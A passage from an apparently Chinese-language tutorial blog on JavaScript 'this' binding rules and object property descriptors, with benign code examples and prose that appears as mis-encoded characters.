class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` ä¹Ÿæ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡çš„å±æ€§</span><br><span class="line"></span><br><span class="line">setTimeout( obj.foo, 100 ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ä»¬åˆšåˆšçœ‹åˆ°çš„ï¼Œæˆ‘ä»¬çš„å›è°ƒå‡½æ•°ä¸¢æ‰ä»–ä»¬çš„ this ç»‘å®šæ˜¯ååˆ†å¸¸è§çš„äº‹æƒ…ã€‚ä½†æ˜¯ this ä½¿æˆ‘ä»¬åƒæƒŠçš„å¦ä¸€ç§æ–¹å¼æ˜¯ï¼Œæ¥æ”¶æˆ‘ä»¬å›è°ƒçš„å‡½æ•°æ•…æ„æ”¹å˜è°ƒç”¨çš„ thisã€‚é‚£äº›å¾ˆæµè¡Œçš„ JavaScript åº“ä¸­çš„äº‹ä»¶å¤„ç†å™¨å°±ååˆ†å–œæ¬¢å¼ºåˆ¶ä½ çš„å›è°ƒçš„ this æŒ‡å‘è§¦å‘äº‹ä»¶çš„ DOM å…ƒç´ ã€‚è™½ç„¶æœ‰æ—¶è¿™å¾ˆæœ‰ç”¨ï¼Œä½†å…¶ä»–æ—¶å€™è¿™ç®€ç›´èƒ½æ°”æ­»äººã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™äº›å·¥å…·å¾ˆå°‘ç»™ä½ é€‰æ‹©ã€‚</p><h4 id="æ˜ç¡®ç»‘å®š"><a href="#æ˜ç¡®ç»‘å®š" class="headerlink" title="æ˜ç¡®ç»‘å®š"></a>æ˜ç¡®ç»‘å®š</h4><p>JavaScript è¯­è¨€ä¸­çš„â€œæ‰€æœ‰â€å‡½æ•°éƒ½æœ‰ä¸€äº›å·¥å…·ã€‚å…·ä½“åœ°è¯´ï¼Œå‡½æ•°æ‹¥æœ‰ call(..) å’Œ apply(..) æ–¹æ³•ã€‚</p><p>è¿™äº›å·¥å…·å¦‚ä½•å·¥ä½œï¼Ÿå®ƒä»¬æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯ä¸€ä¸ªç”¨äº this çš„å¯¹è±¡ï¼Œä¹‹åä½¿ç”¨è¿™ä¸ªæŒ‡å®šçš„ this æ¥è°ƒç”¨å‡½æ•°ã€‚å› ä¸ºä½ å·²ç»ç›´æ¥æŒ‡æ˜ä½ æƒ³è®© this æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥æˆ‘ä»¬ç§°è¿™ç§æ–¹å¼ä¸º æ˜ç¡®ç»‘å®šï¼ˆexplicit binding)ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h5 id="API-è°ƒç”¨çš„â€œç¯å¢ƒâ€"><a href="#API-è°ƒç”¨çš„â€œç¯å¢ƒâ€" class="headerlink" title="API è°ƒç”¨çš„â€œç¯å¢ƒâ€"></a>API è°ƒç”¨çš„â€œç¯å¢ƒâ€</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo(el) &#123;</span><br><span class="line">console.log( el, this.id );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">id: &quot;awesome&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// ä½¿ç”¨ `obj` ä½œä¸º `this` æ¥è°ƒç”¨ `foo(..)`</span><br><span class="line">[1, 2, 3].forEach( foo, obj ); // 1 awesome  2 awesome  3 awesome</span><br></pre></td></tr></table></figure><h4 id="new-ç»‘å®š"><a href="#new-ç»‘å®š" class="headerlink" title="new ç»‘å®š"></a>new ç»‘å®š</h4><p>å½“ä½¿ç”¨ new æ“ä½œç¬¦æ¥åˆå§‹åŒ–ä¸€ä¸ªç±»æ—¶ï¼Œè¿™ä¸ªç±»çš„æ„é€ å™¨å°±ä¼šè¢«è°ƒç”¨ã€‚é€šå¸¸çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">something = new MyClass(..);</span><br></pre></td></tr></table></figure><p class="tip">å®é™…ä¸Š JavaScript çš„æœºåˆ¶å’Œ new åœ¨ JS ä¸­çš„ç”¨æ³•æ‰€æš—ç¤ºçš„é¢å‘ç±»çš„åŠŸèƒ½ æ²¡æœ‰ä»»ä½•è”ç³»ã€‚åœ¨ JS ä¸­ï¼Œæ„é€ å™¨ ä»…ä»…æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä»¬å¶ç„¶åœ°ä¸å‰ç½®çš„ new æ“ä½œç¬¦ä¸€èµ·è°ƒç”¨ã€‚å®ƒä»¬ä¸ä¾é™„äºç±»ï¼Œå®ƒä»¬ä¹Ÿä¸åˆå§‹åŒ–ä¸€ä¸ªç±»ã€‚å®ƒä»¬ç”šè‡³ä¸æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ç±»å‹ã€‚å®ƒä»¬æœ¬è´¨ä¸Šåªæ˜¯ä¸€èˆ¬çš„å‡½æ•°ï¼Œåœ¨è¢«ä½¿ç”¨ new æ¥è°ƒç”¨æ—¶æ”¹å˜äº†è¡Œä¸ºã€‚</p><blockquote><p>å½“åœ¨å‡½æ•°å‰é¢è¢«åŠ å…¥ new è°ƒç”¨æ—¶ï¼Œä¹Ÿå°±æ˜¯æ„é€ å™¨è°ƒç”¨æ—¶ï¼Œä¸‹é¢è¿™äº›äº‹æƒ…ä¼šè‡ªåŠ¨å®Œæˆï¼š</p></blockquote><ul><li>ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ä¼šå‡­ç©ºåˆ›å»ºï¼ˆå°±æ˜¯è¢«æ„å»ºï¼‰</li><li>è¿™ä¸ªæ–°æ„å»ºçš„å¯¹è±¡ä¼šè¢«æ¥å…¥åŸå½¢é“¾ï¼ˆ[[Prototype]]-linkedï¼‰</li><li>è¿™ä¸ªæ–°æ„å»ºçš„å¯¹è±¡è¢«è®¾ç½®ä¸ºå‡½æ•°è°ƒç”¨çš„ this ç»‘å®š</li><li>é™¤éå‡½æ•°è¿”å›ä¸€ä¸ªå®ƒè‡ªå·±çš„å…¶ä»– å¯¹è±¡ï¼Œå¦åˆ™è¿™ä¸ªè¢« new è°ƒç”¨çš„å‡½æ•°å°† è‡ªåŠ¨ è¿”å›è¿™ä¸ªæ–°æ„å»ºçš„å¯¹è±¡ã€‚</li></ul><p>ç®€å•æ¥è¯´é€šè¿‡newæ–¹æ³•åˆå§‹åŒ–çš„æ„é€ å™¨thisæŒ‡å‘å‡½æ•°æœ¬èº«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">this.a = a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var bar = new foo( 2 );</span><br><span class="line">console.log( bar.a ); // 2</span><br></pre></td></tr></table></figure><h3 id="ä¸€åˆ‡çš†æœ‰é¡ºåº"><a href="#ä¸€åˆ‡çš†æœ‰é¡ºåº" class="headerlink" title="ä¸€åˆ‡çš†æœ‰é¡ºåº"></a>ä¸€åˆ‡çš†æœ‰é¡ºåº</h3><p class="tip">ä¸Šé¢å·²ç»æ­ç¤ºäº†å››ç§thisç»‘å®šæœ€ç»ˆæŒ‡å‘çš„è§„åˆ™ï¼Œä½†æ˜¯æŒ‡å‘çš„è§„åˆ™å¯èƒ½ä¼šå‡ºç°é‡å çš„æƒ…å†µï¼Œå½“ä¸¤ç§ä»¥ä¸Šçš„è§„åˆ™å‡ºç°åå¦‚ä½•æŠ‰æ‹©ä¼˜å…ˆé¡ºåºå‘¢ã€‚</p><ul><li>å‡½æ•°æ˜¯é€šè¿‡ new è¢«è°ƒç”¨çš„å—ï¼ˆnew ç»‘å®šï¼‰ï¼Ÿå¦‚æœæ˜¯ï¼Œthis å°±æ˜¯æ–°æ„å»ºçš„å¯¹è±¡ã€‚<ul><li>var bar = new foo()</li></ul></li><li>å‡½æ•°æ˜¯é€šè¿‡ call æˆ– apply è¢«è°ƒç”¨ï¼ˆæ˜ç¡®ç»‘å®šï¼‰ï¼Œç”šè‡³æ˜¯éšè—åœ¨ bind ç¡¬ç»‘å®š ä¹‹ä¸­å—ï¼Ÿå¦‚æœæ˜¯ï¼Œthis å°±æ˜¯é‚£ä¸ªè¢«æ˜ç¡®æŒ‡å®šçš„å¯¹è±¡ã€‚<ul><li>var bar = foo.call( obj2 )</li></ul></li><li>å‡½æ•°æ˜¯é€šè¿‡ç¯å¢ƒå¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºæ‹¥æœ‰è€…æˆ–å®¹å™¨å¯¹è±¡ï¼‰è¢«è°ƒç”¨çš„å—ï¼ˆéšå«ç»‘å®šï¼‰ï¼Ÿå¦‚æœæ˜¯ï¼Œthis å°±æ˜¯é‚£ä¸ªç¯å¢ƒå¯¹è±¡ã€‚<ul><li>var bar = obj1.foo()</li></ul></li><li>å¦åˆ™ï¼Œä½¿ç”¨é»˜è®¤çš„ thisï¼ˆé»˜è®¤ç»‘å®šï¼‰ã€‚å¦‚æœåœ¨ strict mode ä¸‹ï¼Œå°±æ˜¯ undefinedï¼Œå¦åˆ™æ˜¯ global å¯¹è±¡ã€‚<ul><li>var bar = foo()</li></ul></li></ul><h3 id="ç»‘å®šçš„ç‰¹ä¾‹"><a href="#ç»‘å®šçš„ç‰¹ä¾‹" class="headerlink" title="ç»‘å®šçš„ç‰¹ä¾‹"></a>ç»‘å®šçš„ç‰¹ä¾‹</h3><p>æ­£å¦‚é€šå¸¸çš„é‚£æ ·ï¼Œå¯¹äºâ€œè§„åˆ™â€æ€»æœ‰ä¸€äº› ä¾‹å¤–ã€‚</p><h4 id="è¢«å¿½ç•¥çš„-this"><a href="#è¢«å¿½ç•¥çš„-this" class="headerlink" title="è¢«å¿½ç•¥çš„ this"></a>è¢«å¿½ç•¥çš„ this</h4><p class="tip">å¦‚æœä½ ä¼ é€’ null æˆ– undefined ä½œä¸º callã€apply æˆ– bind çš„ this ç»‘å®šå‚æ•°ï¼Œé‚£ä¹ˆè¿™äº›å€¼ä¼šè¢«å¿½ç•¥æ‰ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ é»˜è®¤ç»‘å®š è§„åˆ™å°†é€‚ç”¨äºè¿™ä¸ªè°ƒç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo.call( null ); // 2</span><br></pre></td></tr></table></figure><blockquote><p>æ›´å®‰å…¨çš„ this</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function foo(a,b) &#123;</span><br><span class="line">console.log( &quot;a:&quot; + a + &quot;, b:&quot; + b );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// æˆ‘ä»¬çš„ DMZ ç©ºå¯¹è±¡</span><br><span class="line">var Ã¸ = Object.create( null );</span><br><span class="line"></span><br><span class="line">// å°†æ•°ç»„æ•£å¼€ä½œä¸ºå‚æ•°</span><br><span class="line">foo.apply( Ã¸, [2, 3] ); // a:2, b:3</span><br><span class="line"></span><br><span class="line">// ç”¨ `bind(..)` è¿›è¡Œ currying</span><br><span class="line">var bar = foo.bind( Ã¸, 2 );</span><br><span class="line">bar( 3 ); // a:2, b:3</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡è®©å…¶æŒ‡å‘ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œä½¿å…¶æŒ‰ç…§<code>ç¡¬ç»‘å®š</code>åŸåˆ™è¿›è¡Œ</p><h4 id="é—´æ¥"><a href="#é—´æ¥" class="headerlink" title="é—´æ¥"></a>é—´æ¥</h4><p>é€šè¿‡èµ‹å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line">var o = &#123; a: 3, foo: foo &#125;;</span><br><span class="line">var p = &#123; a: 4 &#125;;</span><br><span class="line"></span><br><span class="line">o.foo(); // 3</span><br><span class="line">(p.foo = o.foo)(); // 2</span><br></pre></td></tr></table></figure><h3 id="è¯æ³•this"><a href="#è¯æ³•this" class="headerlink" title="è¯æ³•this"></a>è¯æ³•this</h3><blockquote><p>ä¸€ä¸ªç®­å¤´å‡½æ•°çš„è¯æ³•ç»‘å®šæ˜¯ä¸èƒ½è¢«è¦†ç›–</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">  // è¿”å›ä¸€ä¸ªç®­å¤´å‡½æ•°</span><br><span class="line">return (a) =&gt; &#123;</span><br><span class="line">    // è¿™é‡Œçš„ `this` æ˜¯è¯æ³•ä¸Šä» `foo()` é‡‡ç”¨çš„</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var bar = foo.call( obj1 );</span><br><span class="line">bar.call( obj2 ); // 2, ä¸æ˜¯3!</span><br></pre></td></tr></table></figure><blockquote><p>å®ƒä»¬æœ¬è´¨æ˜¯ä½¿ç”¨å¹¿ä¸ºäººçŸ¥çš„è¯æ³•ä½œç”¨åŸŸæ¥ç¦æ­¢äº†ä¼ ç»Ÿçš„ <code>this</code> æœºåˆ¶</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">var self = this; // è¯æ³•ä¸Šæ•è· `this`</span><br><span class="line">setTimeout( function()&#123;</span><br><span class="line">console.log( self.a );</span><br><span class="line">&#125;, 100 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h2 id="äºŒã€å¯¹è±¡"><a href="#äºŒã€å¯¹è±¡" class="headerlink" title="äºŒã€å¯¹è±¡"></a>äºŒã€å¯¹è±¡</h2><p>å‰é¢æˆ‘ä»¬è®²è§£äº† this ç»‘å®šå¦‚ä½•æ ¹æ®å‡½æ•°è°ƒç”¨çš„è°ƒç”¨ç‚¹æŒ‡å‘ä¸åŒçš„å¯¹è±¡ã€‚ä½†ç©¶ç«Ÿä»€ä¹ˆæ˜¯å¯¹è±¡ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æŒ‡å‘å®ƒä»¬ï¼Ÿ</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p class="tip">å¯¹è±¡æ¥è‡ªäºä¸¤ç§å½¢å¼ï¼šå£°æ˜ï¼ˆå­—é¢ï¼‰å½¢å¼ï¼Œå’Œæ„é€ å½¢å¼ã€‚</p><blockquote><p>ä¸€ä¸ªå¯¹è±¡çš„å­—é¢è¯­æ³•çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">key: value</span><br><span class="line">// ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ„é€ å½¢å¼çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myObj = new Object();</span><br><span class="line">myObj.key = value;</span><br></pre></td></tr></table></figure><p>æ„é€ å½¢å¼å’Œå­—é¢å½¢å¼çš„ç»“æœæ˜¯å®Œå…¨åŒç§ç±»çš„å¯¹è±¡ã€‚å”¯ä¸€çœŸæ­£çš„åŒºåˆ«åœ¨äºä½ å¯ä»¥å‘å­—é¢å£°æ˜ä¸€æ¬¡æ€§æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªé”®/å€¼å¯¹ï¼Œè€Œå¯¹äºæ„é€ å½¢å¼ï¼Œä½ å¿…é¡»ä¸€ä¸ªä¸€ä¸ªåœ°æ·»åŠ å±æ€§ã€‚</p><h3 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h3><blockquote><p>JS çš„å…­ç§ä¸»è¦ç±»å‹</p></blockquote><ul><li>string</li><li>number</li><li>boolean</li><li>null</li><li>undefined</li><li>object</li></ul><blockquote><p>å†…å»ºå¯¹è±¡</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>Object</li><li>Function</li><li>Array</li><li>Date</li><li>RegExp</li><li>Error</li></ul><h3 id="åŸºæœ¬å­—é¢é‡"><a href="#åŸºæœ¬å­—é¢é‡" class="headerlink" title="åŸºæœ¬å­—é¢é‡"></a>åŸºæœ¬å­—é¢é‡</h3><p>åœ¨JavaScriptä¸­åŸºæœ¬å­—é¢é‡ä¼šè½¬æ¢æˆå¯¹è±¡</p><p class="tip">ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬é€šè¿‡åŸºæœ¬å­—é¢é‡ï¼š<code>let str = &#39;hello world&#39;;</code>åˆ›å»ºçš„å­—ç¬¦ä¸²ï¼Œä»–åªæ˜¯ä¸ªåŸºæœ¬ç±»å‹æŒ‰é“ç†æ¥è¯´ä¸å­˜åœ¨å±æ€§ï¼Œä½†é€šè¿‡<code>str.length</code>å´å¯ä»¥è½»æ¾æ¸ é“strå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼ŒåŸæ¥JavaScriptä¼šå°†<strong>å­—é¢é‡å½¢å¼çš„str</strong>ï¼Œè½¬å˜æˆ<code>String</code>å¯¹è±¡å½¢å¼çš„å­—ç¬¦ä¸²</p><blockquote><p>åŸºæœ¬å­—é¢é‡è½¬å˜æˆå¯¹è±¡çš„ç±»å‹</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>RegExp</li></ul><blockquote><p>æ·±æµ…æ‹·è´</p></blockquote><p>åœ¨è¿›è¡Œæ·±æµ…æ‹·è´å‰ï¼Œæˆ‘ä»¬å…ˆæ˜ç¡®ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹å’Œå¤æ‚ç±»å‹èµ‹å€¼çš„ä¸åŒï¼š</p><ul><li>åœ¨æˆ‘ä»¬è¿›è¡Œèµ‹å€¼æ“ä½œçš„æ—¶å€™ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹çš„èµ‹å€¼ï¼ˆ=ï¼‰æ˜¯åœ¨å†…å­˜ä¸­æ–°å¼€è¾Ÿä¸€æ®µæ ˆå†…å­˜ï¼Œç„¶åå†æŠŠå†å°†å€¼èµ‹å€¼åˆ°æ–°çš„æ ˆä¸­</li><li>ä½†æ˜¯å¼•ç”¨ç±»å‹çš„èµ‹å€¼æ˜¯ä¼ å€ã€‚åªæ˜¯æ”¹å˜æŒ‡é’ˆçš„æŒ‡å‘ï¼Œä¾‹å¦‚ï¼Œä¹Ÿå°±æ˜¯è¯´å¼•ç”¨ç±»å‹çš„èµ‹å€¼æ˜¯å¯¹è±¡ä¿å­˜åœ¨æ ˆä¸­çš„åœ°å€çš„èµ‹å€¼ï¼Œè¿™æ ·çš„è¯ä¸¤ä¸ªå˜é‡å°±æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤ä¸¤è€…ä¹‹é—´æ“ä½œäº’ç›¸æœ‰å½±å“</li></ul><blockquote><p>èµ‹å€¼ï¼ˆ=ï¼‰å’Œæµ…æ‹·è´çš„åŒºåˆ«</p></blockquote><p>æµ…å¤åˆ¶åªä¼šå°†å¯¹è±¡çš„å„ä¸ªå±æ€§è¿›è¡Œä¾æ¬¡å¤åˆ¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œé€’å½’å¤åˆ¶ï¼Œè€Œ JavaScript å­˜å‚¨å¯¹è±¡éƒ½æ˜¯å­˜åœ°å€çš„ï¼Œæ‰€ä»¥æµ…å¤åˆ¶ä¼šå¯¼è‡´èµ‹å€¼åçš„å¯¹è±¡å±æ€§æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€</p><h3 id="å±æ€§æè¿°ç¬¦"><a href="#å±æ€§æè¿°ç¬¦" class="headerlink" title="å±æ€§æè¿°ç¬¦"></a>å±æ€§æè¿°ç¬¦</h3><blockquote><p>è·å–å¯¹è±¡å±æ€§æ€§è´¨</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.getOwnPropertyDescriptor( myObject, &quot;a&quot; );</span><br><span class="line">// &#123;</span><br><span class="line">//    value: 2,</span><br><span class="line">//    writable: true,</span><br><span class="line">//    enumerable: true,</span><br><span class="line">//    configurable: true</span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ˜ç¡®å®šä¹‰ä¸€ä¸ªå±æ€§</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2,</span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true</span><br><span class="line">&#125; );</span><br><span class="line"></span><br><span class="line">myObject.a; // 2</span><br></pre></td></tr></table></figure><p class="tip">ä½¿ç”¨ defineProperty(..)ï¼Œæˆ‘ä»¬æ‰‹åŠ¨ã€æ˜ç¡®åœ°åœ¨ myObject ä¸Šæ·»åŠ äº†ä¸€ä¸ªç›´ç™½çš„ï¼Œæ™®é€šçš„ a å±æ€§ã€‚ç„¶è€Œï¼Œä½ é€šå¸¸ä¸ä¼šä½¿ç”¨è¿™ç§æ‰‹åŠ¨æ–¹æ³•ï¼Œé™¤éä½ æƒ³è¦æŠŠæè¿°ç¬¦çš„æŸä¸ªæ€§è´¨ä¿®æ”¹ä¸ºä¸åŒçš„å€¼ã€‚</p><blockquote><p>ä¿®æ”¹å±æ€§æ€§è´¨</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">    a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2, </span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true </span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure><ul><li>value<ul><li>é»˜è®¤å€¼ï¼šè®¾ç½®çš„åˆå§‹å€¼</li></ul></li><li>writable<ul><li>å¯ä¿®æ”¹æ€§</li><li>é»˜è®¤å€¼ï¼štrue</li><li>å°†å±æ€§è®¾ç½®trueåï¼Œä¿®æ”¹å±æ€§å€¼ï¼Œå°†ä¼šå‘ç”Ÿ<code>TypeError</code>(å¦‚æœä½ è¯•å›¾æ”¹å˜ä¸€ä¸ªä¸å¯é…ç½®å±æ€§çš„æè¿°ç¬¦å®šä¹‰ï¼Œå°±ä¼šå‘ç”Ÿ TypeError)</li></ul></li><li>configurable<ul><li>å¯é…ç½®æ€§</li><li>èƒ½å¦é€šè¿‡definePropertyé‡æ–°å®šä¹‰ç‰¹æ€§</li><li>è®¾ç½®falseåæ— æ³•ï¼Œæ›´æ”¹ç‰¹æ€§</li><li>é»˜è®¤å€¼ï¼štrue</li><li>é˜»æ­¢çš„å¦å¤–ä¸€ä¸ªäº‹æƒ…æ˜¯ä½¿ç”¨ delete æ“ä½œç¬¦ç§»é™¤æ—¢å­˜å±æ€§çš„èƒ½åŠ›</li></ul></li><li>enumerable<ul><li>å¯éå†æ€§</li><li>é»˜è®¤å€¼ï¼štrue</li></ul></li></ul><h3 id="è®¾ç½®å¯¹è±¡çš„å‡ ä¸ªæ–¹æ³•"><a href="#è®¾ç½®å¯¹è±¡çš„å‡ ä¸ªæ–¹æ³•" class="headerlink" title="è®¾ç½®å¯¹è±¡çš„å‡ ä¸ªæ–¹æ³•"></a>è®¾ç½®å¯¹è±¡çš„å‡ ä¸ªæ–¹æ³•</h3><h4 id="é˜²æ­¢æ‰©å±•-Prevent-Extensions"><a href="#é˜²æ­¢æ‰©å±•-Prevent-Extensions" class="headerlink" title="é˜²æ­¢æ‰©å±•(Prevent Extensions)"></a>é˜²æ­¢æ‰©å±•(Prevent Extensions)</h4><p><code>Object.preventExtensions(..)</code></p><p class="tip">ä¸èƒ½æ·»åŠ æ–°çš„å±æ€§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.preventExtensions( myObject );</span><br><span class="line"></span><br><span class="line">myObject.b = 3;</span><br><span class="line">myObject.b; // undefined</span><br></pre></td></tr></table></figure><h4 id="å°å°ï¼ˆSealï¼‰"><a href="#å°å°ï¼ˆSealï¼‰" class="headerlink" title="å°å°ï¼ˆSealï¼‰"></a>å°å°ï¼ˆSealï¼‰</h4><p><code>Object.Seal(..)</code></p><p class="tip">å®ƒå®è´¨ä¸Šåœ¨å½“å‰çš„å¯¹è±¡ä¸Šè°ƒç”¨ 